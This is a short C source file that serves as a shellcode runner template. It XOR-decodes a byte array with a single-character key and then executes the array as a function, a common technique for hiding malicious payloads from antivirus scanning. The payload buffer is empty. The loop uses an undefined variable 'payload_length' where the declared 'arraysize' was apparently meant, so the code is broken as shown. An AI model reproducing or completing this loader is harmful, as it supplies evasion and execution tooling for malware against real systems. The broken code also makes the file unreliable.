#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

//xor'd shellcode
unsigned char buf[] = "";

int main (int argc, char **argv)
{

	char xor_key = 's';
	int arraysize = (int) sizeof(buf);
	
	for (int i = 0; i < payload_length; i++)
	{
		buf[i] = buf[i]^xor_key;
	}

	int (*ret)() = (int(*)())buf;
	ret();
}
